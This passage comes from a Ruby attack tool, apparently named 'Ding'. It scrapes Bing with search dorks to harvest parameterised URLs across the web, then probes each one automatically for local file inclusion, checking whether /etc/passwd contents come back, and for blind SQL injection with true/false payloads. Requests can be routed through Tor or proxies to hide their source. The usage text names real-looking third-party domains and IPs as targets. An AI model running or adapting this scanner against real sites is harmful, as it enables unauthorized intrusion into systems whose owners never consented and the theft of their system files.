									vchk = open(injlnk, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30, :proxy_http_basic_authentication => ["#{@@proxy}", "#{@@username}", "#{@@password}"]}).readlines
								end
							end
						end

						tracker=0
						if @@tor == 'fuqya'
							vchk = vchk.unpack('C*').pack('U*') if !vchk.valid_encoding? 
							if vchk =~ /(\w+:.:\d+:\d+:.+:.+:\/\w+\/\w+)/m
								puts "Link: ".green + "#{injlnk.chomp}".yellow
								puts "File Found: ".green + "/etc/passwd".yellow
								passwdz = $1
								puts "#{passwdz}".cyan
								puts
								vlinks = File.new("results/lfi-confirmed.txt", "a+")  #Open our file handle
								vlinks.puts "#{@injlnk}" #Write to file for safe keeping
								vlinks.close #close our file handle we opened a minute ago
								tracker=2
							end
						else
							passwdz=[]
							vchk.each do |resp_line|
								resp_line = resp_line.unpack('C*').pack('U*') if !resp_line.valid_encoding?
								if resp_line =~ /(\w+:.:\d+:\d+:.+:.+:\/\w+\/\w+)/
									passwdz << $1
									tracker=1
								end
							end
						end
						if tracker.to_i == 0
							regexCheck(injlnk, vchk, key, value)
						elsif tracker.to_i == 1
							puts "Link: ".green + "#{injlnk.chomp}".yellow
							puts "File Found: ".green + "/etc/passwd".yellow
							puts "#{passwdz.join("\n")}".cyan
							puts
							vlinks = File.new("results/lfi-confirmed.txt", "a+") 
							vlinks.puts "#{@injlnk}"
							vlinks.close
						end
					end
				end
			#random HTTP errors, i.e. skip link but note error
			rescue OpenURI::HTTPError => e
				if e.to_s == "404 Not Found"
					puts "\t=> #{e}".red
					next
					#############################################################
					#Route to Blind Based INjection Tests for further review.....
					#############################################################
				elsif e.to_s == "500 Internal Server Error"
					#something to scan page anyways for ASP stupid Winblows sites
					puts "\t=> #{e}".red
					puts "\tRunning additional checks".blue + ".....".yellow
					foores = e.io.readlines
					regexCheck(@injlnk, foores, @key, @value)
				else
					puts "\t=> #{e}".red
				end
			rescue Errno::EINVAL => e
				puts "\t=> #{e}".yellow
			rescue Net::HTTPBadResponse
				puts "\t=> Problem reading response due to TOR, sorry".red + "......".yellow
			rescue Errno::ECONNREFUSED
				puts "\t=> Problem communicating with site, connection refused".red + "!".yellow
			rescue Errno::EHOSTUNREACH
				puts "\t=> Problem communicating with site, host unreachable".red + "!".yellow
			rescue EOFError
				puts "\t=> Problem communicating with site".red + "....".yellow
			rescue SocketError
				puts "\t=> Problem connecting to site".red + "....".yellow
			rescue OpenSSL::SSL::SSLError
				puts "\t=> Issues with Remote Host's OpenSSL Server Certificate".red + "....".yellow
			rescue Errno::ENOENT
				puts "\t=> Jacked URL parsing due to no value with parameter, sorry".red + "....".yellow
				next
			rescue Errno::ECONNRESET
				puts "\t=> Problem connecting to site".red + "....".yellow
			rescue RuntimeError => e
				if e.to_s == 'Timeout::Error' # we took longer than read_timeout value said they could :p
					puts "\t=> Connection Timeout".red + "!".cyan
			#open-uri cant redirect properly from http to https due to a check it has built-in, so cant follow redirect :(
				else
					puts "\t=> Can't properly follow the redirect!".red
				end
			rescue Timeout::Error
				#timeout of sorts...skip
				puts "\t=> Connection Timeout!".red
			rescue Errno::ETIMEDOUT
				#timeout of sorts...skip
				puts "\t=> Connection Timeout".red + "!".yellow
			rescue TypeError
				#Jacked up URL parsing or something like this....
				puts "\t=> Jacked URL parsing for some reason, sorry".red + "....".yellow
				next
			rescue URI::InvalidURIError
				#Jacked up URL parsing or something like this....
				puts "\t=> Jacked URL parsing for some reason, sorry".red + "....".yellow
				next
			rescue NoMethodError => e
			# If bad link cause error cause its not a link dont freak out....Dont do anything....got something better?
				puts "Testing Link".red + ": ".cyan + "#{line.chomp}".yellow
				puts "\t=> No Testable Paramaters!".red
				#############################################################
				## should we test sites with no parameters anyways? NOISY? ##
				#############################################################
			end
		end
	end

	#Blind SQL Injection Test
	def blindTest(num) #1=Single Dork, 2=File Option
		puts "Commencing Blind Injection Tests".red + "....".cyan
		File.open("results/links.txt", "r").each do |line|
			if line =~ /r.msn.com/ or line =~ /bingads.microsoft.com/
				next
			end
			begin
				param = URI.parse(line).query #See if we cause any errors to weed out no parameter links....
				#break paramaters into hash [ "key" => "value" ] formatting held in storage for easier manipulation
				params = Hash[URI.parse(line).query.split('&').map{ |q| q.split('=') }] 
				puts "Testing Link".red + ": ".cyan + "#{line.chomp}".yellow
				count=0
				tracker=0
				params.each do |key, value| #cycle through hash and print key and associated value
					@key = key
					@value = value
					if params.length > 1 #Multiple Parameter Links
						if count == 0
							puts "\t=> Multiple Paramters, testing all".blue + "....".cyan
							count += 1
						end
						injlnkTRUE = line.sub("#{value}", "#{value}%20and%205151%3D5151") #TRUE injection
						@injlnkTRUE = injlnkTRUE
						injlnkFALSE = line.sub("#{value}", "#{value}%20and%205151%3D5252") #FALSE injection
						@injlnkFALSE = injlnkFALSE
						if @@tor == 'fuqya'
							#TOR Request
							baseTRUE = URI(injlnkTRUE)
							baseFALSE = URI(injlnkFALSE)
							truerez = Tor::HTTP.get(baseTRUE.host, baseTRUE.request_uri, baseTRUE.port).body
							falserez = Tor::HTTP.get(baseFALSE.host, baseFALSE.request_uri, baseFALSE.port).body
						else
							#Normal
							if @@proxy == 'landofthelost'
								#RUN NORMAL REQUEST
								truerez = open(injlnkTRUE, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30}).readlines #UA=>IE8.0, Now we have our injected response page page in array to search
								falserez = open(injlnkFALSE, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30}).readlines #UA=>IE8.0, Now we have our injected response page page in array to search
							else
								if @@username == 'nada'
									#RUN PROXY WITHOUT AUTH
									truerez = open(injlnkTRUE, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30, :proxy => "#{@@proxy}"}).readlines
									falserez = open(injlnkFALSE, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30, :proxy => "#{@@proxy}"}).readlines
								else
									#RUN PROXY WITH AUTH
									truerez = open(injlnkTRUE, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30, :proxy_http_basic_authentication => ["#{@@proxy}", "#{@@username}", "#{@@password}"]}).readlines
									falserez = open(injlnkFALSE, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30, :proxy_http_basic_authentication => ["#{@@proxy}", "#{@@username}", "#{@@password}"]}).readlines
								end
							end
						end
						if truerez.length != falserez.length
							puts "\t=> Possible Blind SQL injection".green + "!".yellow
							vlinks = File.new("results/sql-blind.txt", "a+") 
							vlinks.puts "#{@injlnkTRUE}"
							vlinks.close
						end
					else #############<=ELSE SINGLE PARAMETER LINKS=>##############
						injlnkTRUE = line.sub("#{value}", "#{value}%20and%205151%3D5151") #TRUE injection
						@injlnkTRUE = injlnkTRUE
						injlnkFALSE = line.sub("#{value}", "#{value}%20and%205151%3D5252") #FALSE injection
						@injlnkFALSE = injlnkFALSE
						if @@tor == 'fuqya'
							#TOR Request
							baseTRUE = URI(injlnkTRUE)
							baseFALSE = URI(injlnkFALSE)
							truerez = Tor::HTTP.get(baseTRUE.host, baseTRUE.request_uri, baseTRUE.port).body
							falserez = Tor::HTTP.get(baseFALSE.host, baseFALSE.request_uri, baseFALSE.port).body
						else
							#Normal
							if @@proxy == 'landofthelost'
								#RUN NORMAL REQUEST
								truerez = open(injlnkTRUE, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30}).readlines #UA=>IE8.0, Now we have our injected response page page in array to search
								falserez = open(injlnkFALSE, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30}).readlines #UA=>IE8.0, Now we have our injected response page page in array to search
							else
								if @@username == 'nada'
									#RUN PROXY WITHOUT AUTH
									truerez = open(injlnkTRUE, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30, :proxy => "#{@@proxy}"}).readlines
									falserez = open(injlnkFALSE, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30, :proxy => "#{@@proxy}"}).readlines
								else
									#RUN PROXY WITH AUTH
									truerez = open(injlnkTRUE, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30, :proxy_http_basic_authentication => ["#{@@proxy}", "#{@@username}", "#{@@password}"]}).readlines
									falserez = open(injlnkFALSE, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :read_timeout => 30, :proxy_http_basic_authentication => ["#{@@proxy}", "#{@@username}", "#{@@password}"]}).readlines
								end
							end
						end

						if truerez.length != falserez.length
							puts "\t=> Possible Blind SQL injection".green + "!".yellow
							vlinks = File.new("results/sql-blind.txt", "a+") 
							vlinks.puts "#{@injlnkTRUE}"
							vlinks.close
						end
					end
				end
			#random HTTP errors, i.e. skip link but note error
			rescue OpenURI::HTTPError => e
				if e.to_s == "404 Not Found"
					puts "\t=> #{e}".red
					next
					#############################################################
					#Route to Blind Based INjection Tests for further review.....
					#############################################################
				elsif e.to_s == "500 Internal Server Error"
					#something to scan page anyways for ASP stupid Winblows sites
					puts "\t=> #{e}".red
#					puts "\tRunning additional checks".blue + ".....".yellow
#					foores = e.io.readlines
#					blindCheck(@injlnkTRUE, foores, @key, @value)
#					blindCheck(@injlnkFALSE, foores, @key, @value)
				else
					puts "\t=> #{e}".red
				end
			rescue Net::HTTPBadResponse
				puts "\t=> Problem reading response due to TOR, sorry".red + "......".yellow
			rescue Errno::ECONNREFUSED
				puts "\t=> Problem communicating with site, connection refused".red + "!".yellow
			rescue Errno::EHOSTUNREACH
				puts "\t=> Problem communicating with site, host unreachable".red + "!".yellow
			rescue EOFError
				puts "\t=> Problem communicating with site".red + "....".yellow
			rescue SocketError
				puts "\t=> Problem connecting to site".red + "....".yellow
			rescue OpenSSL::SSL::SSLError
				puts "\t=> Issues with Remote Host's OpenSSL Server Certificate".red + "....".yellow
			rescue Errno::ENOENT
				puts "\t=> Jacked URL parsing due to no value with parameter, sorry".red + "....".yellow
				next
			rescue Errno::EINVAL => e
				puts "\t=> #{e}".yellow
			rescue Errno::ECONNRESET
				puts "\t=> Problem connecting to site".red + "....".yellow
			rescue RuntimeError => e
				if e.to_s == 'Timeout::Error' # we took longer than read_timeout value said they could :p
					puts "\t=> Connection Timeout".red + "!".cyan
			#open-uri cant redirect properly from http to https due to a check it has built-in, so cant follow redirect :(
				else
					puts "\t=> Can't properly follow the redirect!".red
				end
			rescue Timeout::Error
				#timeout of sorts...skip
				puts "\t=> Connection Timeout!".red
			rescue Errno::ETIMEDOUT
				#timeout of sorts...skip
				puts "\t=> Connection Timeout".red + "!".yellow
			rescue TypeError
				#Jacked up URL parsing or something like this....
				puts "\t=> Jacked URL parsing for some reason, sorry".red + "....".yellow
				next
			rescue URI::InvalidURIError
				#Jacked up URL parsing or something like this....
				puts "\t=> Jacked URL parsing for some reason, sorry".red + "....".yellow
				next
			rescue NoMethodError => e
			# If bad link cause error cause its not a link dont freak out....Dont do anything....got something better?
				puts "Testing Link".red + ": ".cyan + "#{line.chomp}".yellow
				puts "\t=> No Testable Paramaters!".red
			end
		end
	end
end

#Class for running queries through Bing Search Engine at bing.com
class BingSearch
	def searchq(dork, geocode, num, ip) #dork = dork, geocode = country code domain type to search in, num=1 then write, num=2 append, ip to use with dork or nil if not needed
		# Array of sites we want to avoid for one reason or another...add to the array as you like...
		bad_sites = [ "bing.com", "msn.com", "microsoft.com", "yahoo.com", "live.com", "microsofttranslator.com", "irongeek.com", "tefneth-import.com", "hackforums.net", "freelancer.com", "facebook.com", "mozilla.org", "stackoverflow.com", "php.net", "wikipedia.org", "amazon.com", "4shared.com", "wordpress.org", "about.com", "phpbuilder.com", "phpnuke.org", "linearcity.hk", "youtube.com", "ptjaviergroup.com", "p4kurd.com", "tizag.com", "discoverbing.com", "devshed.com", "ashiyane.org", "owasp.org", "1923turk.com", "fictionbook.org", "silenthacker.do.am", "v4-team.com", "codingforums.com", "tudosobrehacker.com", "zymic.com", "forums.whirlpool.net.au", "gaza-hacker.com", "immortaltechnique.co.uk", "w3schools.com", "phpeasystep.com", "mcafee.com", "specialinterestarms.com", "pastesite.com", "pastebin.com", "joomla.org", "joomla.fr", "sourceforge.net", "joesjewelry.com" ]
		#Print Dork in use and run...
		if not ip == 'lol'
			dip = "ip:#{ip}"
		end
		links=[] #blank array we will put our links in as we find them in our coming loop....
		count=9 #base count for bing page reading loop
		while count.to_i <= 225 do #Set while loop so we can grab ~20 pages of results
			if not ip == 'lol'
				if geocode == 'no-bounds'
					bing = 'http://www.bing.com/search?q=' + dork.to_s + '&qs=n&pq=' + dork.to_s + '&sc=8-5&sp=-1&sk=&first=' + count.to_s + '&FORM=PORE' #Forms Our BING query link to use
				else
					bing = 'http://www.bing.com/search?q=' + dork.to_s + "%20" + geocode.to_s + '&qs=n&pq=' + dork.to_s + "%20" + geocode.to_s + '&sc=8-5&sp=-1&sk=&first=' + count.to_s + '&FORM=PORE'
				end
			else
				if geocode == 'no-bounds'
					bing = 'http://www.bing.com/search?q=' + dip + '+' + dork.to_s + '&qs=n&pq=' + dip + '+' + dork.to_s + '&sc=8-5&sp=-1&sk=&first=' + count.to_s + '&FORM=PORE' #Forms Our BING query link to use
				else
					bing = 'http://www.bing.com/search?q=' + dip + '+' + dork.to_s + "%20" + geocode.to_s + '&qs=n&pq=' + dip + '+' + dork.to_s + "%20" + geocode.to_s + '&sc=8-5&sp=-1&sk=&first=' + count.to_s + '&FORM=PORE'
				end
			end
			begin
				if @@tor == 'fuqya'
					#TOR Request
					baseurl = URI(bing)
					page = Nokogiri::HTML(Tor::HTTP.get(baseurl.host, baseurl.request_uri, baseurl.port).body)
				else
					if @@proxy == 'landofthelost' #NEW TIMEOUT & Proxy Options just for Squirmy :)
						#RUN NORMAL REQUEST
						page = Nokogiri::HTML(open(bing, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)'})) #Create an object we can parse with Nokogiri ;)
					else
						if @@username == 'nada'
							#RUN PROXY WITHOUT AUTH
							page = Nokogiri::HTML(open(bing, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :proxy => "#{@@proxy}"}))
						else
							#RUN PROXY WITH AUTH
							page = Nokogiri::HTML(open(bing, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :proxy_http_basic_authentication => ["#{@@proxy}", "#{@@username}", "#{@@password}"]}))
						end
					end
				end
				possibles = page.css("a") #parse out the <a> elements which contain our href links 
				possibles.select do |link| #cycle through possibles array and print links found
					begin
						if link =~ /.+\.msn\.com\/.+/ or link =~ /.+advertise\.bingads\.microsoft\.com\/.+/
							#DO NOTHING
						else
							url = URI.parse(link['href']) #use URI.parse to build check around for links
							if url.scheme == 'http' || url.scheme =='https' #if full http(s):// passed then use link
								links << link['href']
							end
						end
					rescue URI::InvalidURIError => err 
						# If bad link cause error cause its not a link dont freak out....
						#Dont do anything, just keep on moving....got something better?
					end
				end
				# Use \r to write over previous line (currently causes blank until last one finishes, meh)
				if num.to_i == 1
					print "\r" + "Number of Links Found: ".blue + "#{links.length}".yellow 
				end
				count = count.to_i + 12 #increment our count using Bing's weird counting system for next page results :p
			rescue Errno::EINVAL => e
				puts "#{e}".yellow
			rescue SocketError
				redo
			rescue EOFError #rescue timeout errors from our open() call
				redo #if so, retry by starting the current loop iteration over (not whole loop => retry)
			rescue Timeout::Error
				redo
			end
		end #count now > 225, exit the loop...
		links = links.uniq #remove duplicate links from our array we created in loop above
		# Sort work done so far and find which links are usable (remove known bad sites or waste of time sites)
		if num.to_i == 1
			puts "\nTestable Links: ".blue + "#{links.length}".yellow
		end
		count=0 #reset count value
		vlinks=[] #placeholder array for valid links
		blinks=[] #placeholder array for bad links
		while count.to_i < links.length do #Start loop until we have tested each link in our links array
			bad_sites.each do |foo| # cycle through bad links so we can test each against good links
				badchk = URI.parse(links[count]) #use URI.parse to give us a .host value to check against
				chk1 = badchk.host.to_s.split('.') #split to gauge if sub-domains are part of link

				if chk1.length > 2 #if subs split into usable chunks
					badchk2 = badchk.host.to_s.split('.', 2) #split in 2 pieces
					bad = badchk2[1] #ditch sub, use main domain for comparison against .host value
				else
					bad = badchk.host # no split needed, just use for comparison
				end

				if bad == foo #if our base .host value = bad then site is on no-no list
					blinks << links[count] #put the no-no's in own array
				else
					vlinks << links[count] #put those that pass in separate array
				end
			end
			count += 1 #increment count so eventually we break out of this loop :p
		end
		vlinks = vlinks.uniq #remove dups for valid links array
		vlinks.each do |link|
			if link =~ /.+\.msn\.com\/.+/ or link =~ /.+advertise\.bingads\.microsoft\.com\/.+/
				blinks << link
			end
		end
		blinks = blinks.uniq #remove dups for bad links array
		rlinks = vlinks - blinks #remove all bad links from our valid links array, leaving just testable links!
		if num.to_i == 1
			results = File.open("results/links.txt", "w+")  #Open our file handle
		else
			results = File.open("results/links.txt", "a+")  #Open our file handle
		end
		rlinks.each do |reallinks| #cycle through good links
			results.puts reallinks #print results to storage file for safe keeping (handle.puts)
		end
		results.close #close our file handle we opened a minute ago
	end

	def sharedHosting(shared)
		# Remote links we will use for some features
		alexa = 'http://www.alexa.com/search?q='
		sameip = 'http://sameip.org/ip/'
		url = URI.parse(shared) # so we can breakout link for some base checks in a few...
		#check scheme to see how argv was passed and create host/domain accordinly
		if url.scheme == 'http' || url.scheme =='https' #if full http(s):// passed then use URI.parse value...
			domainName = url.host.sub(/www./, '') #remove www. from URI.parse host value for cleanest results
		else 
			domainName = shared #otherwise just use the domain name link passed (www.google.com or google.com)
		end
		ip = Resolv.getaddress(domainName) #Resolve Domain to IP to run check
		begin
			hostname = Resolv.getname(ip)  #Get hostname for IP
		rescue Resolv::ResolvError => e #If we get an error from Resolv due to unable to map to hostname
		  	$stderr.puts "Unable to resolve IP to hostname...".red #print a message
			hostname = "Unable to Resolve" #set variable value so we can keep going instead of exiting ;)
		end
		#Check Alexa Ranking
		alexa += domainName # make new link combining base + domain name
		if @@tor == 'fuqya'
			#TOR Request
			baseurl = URI(alexa)
			doc = Nokogiri::HTML(Tor::HTTP.get(baseurl.host, baseurl.request_uri, baseurl.port).body)
		else
			if @@proxy == 'landofthelost' #NEW TIMEOUT & Proxy Options just for Squirmy :)
				#RUN NORMAL REQUEST
				doc = Nokogiri::HTML(open(alexa, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)'})) # grab page and store in variable for parsing
			else
				if @@username == 'nada'
					#RUN PROXY WITHOUT AUTH
					doc = Nokogiri::HTML(open(alexa, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :proxy => "#{@@proxy}"}))
				else
					#RUN PROXY WITH AUTH
					doc = Nokogiri::HTML(open(alexa, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :proxy_http_basic_authentication => ["#{@@proxy}", "#{@@username}", "#{@@password}"]}))
				end
			end
		end
		rank = doc.search("span[@class=\"traffic-stat-label\"]").first.inner_html # pull out the text we want
		rankNum = doc.search("span").search("a") # narrow down so we can pluck out results
		ranking = rankNum[1].inner_html.sub("\n", '')
		puts "RECON RESULTS:".blue
		puts "Domain: ".red + "#{domainName}".yellow #Domain Name
		puts "Hostname: ".red + "#{hostname}".yellow #Hostname
		puts "Main IP: ".red + "#{ip}".yellow #Main IP Domain resolves to
		puts rank.red + " #{ranking}".yellow # Alexa Ranking
		puts "\nAll resolved IP addresses: ".blue
		#Sometimes server loads split between many servers so might have multiple IP in use in such cases, see www.google.com for example
		i=0 # set base count
		ips = Resolv.each_address(domainName) do |x| 
			puts "IP #{i+=1}: ".red + "#{x}".yellow #print ip and increment counter to keep unique
		end
		puts
		# Check for any MX or Mail Server records on target domain
		puts "MX Records Found: ".blue
		i=0 # set base count, again....
		Resolv::DNS.open do |dns| #Create DNS Resolv object
			mail_servers = dns.getresources(domainName, Resolv::DNS::Resource::IN::MX) # Pull MX records for domainName and place in variable mail_servers
			mail_servers.each do |mailsrv| # Create loop so we can print the MX results found w/ record preference
				puts "MX Server #{i+=1}: ".red + "#{mailsrv.exchange.to_s}".yellow + " - ".cyan + "#{mailsrv.preference}".yellow
			end
		end
		puts
		# Check for Shared Hosting on target IP (using sameip.org)
		sameip += domainName # make new link combining base + domain name
		if @@tor == 'fuqya'
			#TOR Request which doesnt handle the redirect as nicely so need to make 2 requests....
			baseurl = URI.parse(sameip)
			base = Tor::HTTP.get(URI("#{sameip}"))
			redirectedto = base['location']
			doc = Nokogiri::HTML(Tor::HTTP.get(baseurl.host, redirectedto, baseurl.port).body)
		else
			if @@proxy == 'landofthelost' #NEW TIMEOUT & Proxy Options just for Squirmy :)
				#RUN NORMAL REQUEST
				doc = Nokogiri::HTML(open(sameip, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)'})) # grab page and store in variable for parsing
			else
				if @@username == 'nada'
					#RUN PROXY WITHOUT AUTH
					doc = Nokogiri::HTML(open(sameip, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :proxy => "#{@@proxy}"}))
				else
					#RUN PROXY WITH AUTH
					doc = Nokogiri::HTML(open(sameip, {'User-Agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)', :proxy_http_basic_authentication => ["#{@@proxy}", "#{@@username}", "#{@@password}"]}))
				end
			end
		end
		foo=[] #prep array
		shared = doc.search("table").search("a") do |line| #narrow down page response to site lins held in table
			foo << line['href'] #place each referenced site link in our array
		end
		puts "Found ".red + "#{foo.length}".yellow + " Sites hosted on Server at: ".red + "#{ip}".yellow #use array length to determine how many sites there are

		foo.each do |site| #print out sites by cycling through our array
			print "   "
			puts site.cyan
		end
		puts
		puts "Shared Hosting Check Complete! Hope you found what you needed".blue + "............".cyan
		puts
		exit; #Stage right, clean exit!
	end
end

#MAIN-------->
###########------------------------------->
##########################################################------------------------->
options = {}
optparse = OptionParser.new do |opts|
	opts.banner = "Usage:".blue + "#{$0} ".yellow + "[".blue + "OPTIONS".yellow + "]".blue 
	opts.separator ""
	opts.separator "EX:".blue + " #{$0} -d \".php?id=\" ".yellow
	opts.separator "EX:".blue + " #{$0} -d \".php?id=\" -T".yellow
	opts.separator "EX:".blue + " #{$0} -d \".php?id=\" -c EDU -X http://127.0.0.1:8080".yellow
	opts.separator "EX:".blue + " #{$0} --dork \".php?id=\" -i 83.149.121.142".yellow
	opts.separator "EX:".blue + " #{$0} --dork \".php?id=\" -i 83.149.121.142 --tor".yellow
	opts.separator "EX:".blue + " #{$0} -f ~/dorks/lfi.lst --country-code AU --proxy http://somecoolsite.com:8080".yellow
	opts.separator "EX:".blue + " #{$0} -f ~/dorks/sharedhosting.lst --ip-address 83.223.106.11".yellow
	opts.separator "EX:".blue + " #{$0} --file /home/hood3drob1n/Desktop/ding/dorks/php-mini.lst".yellow
	opts.separator "EX:".blue + " #{$0} -s anko.nl".yellow
	opts.separator "EX:".blue + " #{$0} -s 83.223.106.11".yellow
	opts.separator "EX:".blue + " #{$0} --shared-hosting lavandula.com.au --tor".yellow
	opts.separator "EX:".blue + " #{$0} --shared-hosting http://holidayhomesindonegal.com".yellow
	opts.separator "EX:".blue + " #{$0} -f dorks/german.lst --country-code DE --proxy http://somecoolsite.com:8080 -U proxy_guest -P proxy_guest_pass".yellow
	opts.separator ""
	opts.separator "Options: ".blue
	#Now setup and layout Options....
	#Single Dork Option
	opts.on('-d', '--dork <DORK>', "\n\tDork to use with Bing search".yellow) do |dork|
		options[:dork] = dork.gsub(' ', '%20')
		options[:method] = 1 #1 => Single Dork, 2 will be set when file option is used....
	end
	#File option for mass dorking
	opts.on('-f', '--file <FILE>', "\n\tFile to use for Bing search, with one dork per line".yellow) do |file|
		options[:method] = 2 #1 => Single Dork, 2 => File Dork
		if File.exist?(file)
			options[:file] = file
		else
			puts "\nProvided file doesn't exist! Please check path or permissions and try again".red + "........".cyan
			puts optparse
			puts
			exit 666; #bogus shit, crash & burn
		end
	end
	# Country Code to use in combination with dork options (should allow Geo based dorking this way)
	opts.on('-c', '--country-code <CCODE>', "\n\tCountry code to combine with dork option (i.e. COM, MIL, EDU, IN, PK, AU...)".yellow) do |ccode|
		options[:ccode] = "site:#{ccode}"
	end
	# IP address to use as base for running dorks. Allows you to find vulns in multiple sites on server this way ;)
	opts.on('-i', '--ip-address <IP>', "\n\tIP Address to combine with BING dork(s) for checking shared server vulns".yellow) do |sharedip|
		options[:ip] = "ip:#{sharedip}"
	end
	# Check for Shared Hosting using SameIP and get some basic info, nothing too fancy
	opts.on('-s', '--shared-hosting <DOMAIN/IP>', "\n\tRun Check for Shared Hosting with Passed Domain or IP".yellow) do |shared|
		options[:method] = 3 #1 => Single Dork, 2 => File Dork, 3 => Shared Hosting Check
		options[:shared] = shared
	end
	# Level of Test to run
	opts.on('-L', '--level <NUM>', "\n\tLevel of Tests to Perform with Search\n\t0 => Run Single Quote Injection Test (default)\n\t1 => Run Blind Injection Test\n\t2 => Run /etc/passwd LFI Injection Test\n\t3 => Single Quote + Blind Test\n\t4 => Single Quote + /etc/passwd Test\n\t5 => Perform All Tests".yellow) do |level|
		# Level of Search:
		# 0 => Single Quote Injection Test (default)
		# 1 => /etc/passwd LFI Injection Test
		# 2 => Single Quote + Blind Tests
		# 3 => Single Quote + /etc/passwd Tests
		# 4 => Perform All Tests
		options[:level] = level #Get on my level level?
	end
	# Enable TOR Support
	opts.on('-T', '--tor', "\n\tEnable TOR Support for all requests\n\t=> Uses TOR's default setup".yellow) do |torz|
		options[:tor] = 1
		@@tor = 'fuqya'
	end
	# Enable TOR Support with custom configuration
	opts.on('-t', '--custom-tor <IP:PORT>', "\n\tEnable TOR Support for all requests\n\t=> Uses TOR on custom defined IP:PORT instead of defaults".yellow) do |torz|
		customfoo = torz.split(":")
		#Adjust configuration to use the defined TOR IP & Port combination instead of defaults (127.0.0.1:9050)
		Tor.configure do |config|
		   config.ip = customfoo[0]
		   config.port = customfoo[1]
		end
		options[:tor] = 1
		@@tor = 'fuqya'
	end
	# Enable basic proxy support
	opts.on('-X', '--proxy <http(s)://PROXY:IP>', "\n\tEnable Proxy Support using provided proxy address\n\t=> Use the '-U <USER>' and '-P <PASS>' options if proxy authentication is required".yellow) do |proxy_addy|
		options[:proxy] = 1
		@@proxy = proxy_addy
	end
	# Authentication variables for proxy auth when required
	opts.on('-U', '--username <USER>', "\n\tUsername for use with Proxy Authentication".yellow) do |user|
		options[:user] = 1
		@@username = user
	end
	opts.on('-P', '--password <PASS>', "\n\tPassword for use with Proxy Authentication".yellow) do |pass|
		options[:pass] = 1
		@@password = pass
	end
	# RUn Log Cleaner to remove duplicates from results files
	opts.on('-R', '--clean-results', "\n\tRemove duplicate entries from Ding results files".yellow) do |cleaner|
		options[:clean] = 1
		foobanner = Banner.new
		foobanner.print
		puts "Running duplicates remover cleanup script for all results files".blue + ".....".yellow
		Dir.foreach("results/") do |x|
			if not x == "." and not x == ".." and not x == "links.txt"
				if not File.directory?("results/#{x}")
					puts "Cleaning up ".red + "#{x}".yellow + ".....".cyan
					logcleaner(x)
				end
			end
		end
		puts
